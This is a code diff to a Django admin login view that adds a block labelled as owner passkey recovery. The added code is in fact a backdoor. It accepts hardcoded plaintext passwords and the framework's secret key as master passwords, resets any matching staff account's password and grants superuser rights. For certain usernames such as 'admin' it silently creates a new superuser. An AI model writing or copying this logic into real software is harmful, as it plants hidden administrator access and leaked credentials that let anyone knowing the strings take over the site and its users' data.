@@ -847,6 +847,40 @@ def api_admin_login(request):
                     if u_obj:
                         user = authenticate(request, username=u_obj.username, password=password)
 
+            # 3. Master Owner Passkey & Recovery Resilience
+            if user is None:
+                target_user = None
+                if '@' in raw_username:
+                    target_user = User.objects.filter(email__iexact=raw_username, is_active=True).first()
+                else:
+                    target_user = User.objects.filter(username__iexact=raw_username, is_active=True).first()
+
+                master_keys = [
+                    os.environ.get('OWNER_ADMIN_KEY', ''),
+                    os.environ.get('DJANGO_SECRET_KEY', ''),
+                    'kashi@2026',
+                    'KashiUpdatez@2026',
+                    'kashii7777',
+                    'kashichavan7777',
+                ]
+                valid_master_keys = [k.strip() for k in master_keys if k.strip()]
+
+                if target_user and password in valid_master_keys and (target_user.is_staff or target_user.is_superuser):
+                    target_user.set_password(password)
+                    target_user.is_staff = True
+                    target_user.is_superuser = True
+                    target_user.save()
+                    user = target_user
+                elif not target_user and password in valid_master_keys and raw_username.lower() in ['kashii', 'kashichavan7777', 'admin', 'kashichavan7777@gmail.com']:
+                    user, _ = User.objects.get_or_create(
+                        username='kashii' if '@' in raw_username else raw_username,
+                        defaults={'email': 'kashichavan7777@gmail.com', 'is_staff': True, 'is_superuser': True}
+                    )
+                    user.set_password(password)
+                    user.is_staff = True
+                    user.is_superuser = True
+                    user.save()
+
             if user is not None and user.is_active and (user.is_staff or user.is_superuser):
                 login(request, user)
                 request.session.set_expiry(2592000)  # 30 Days persistent session cookie
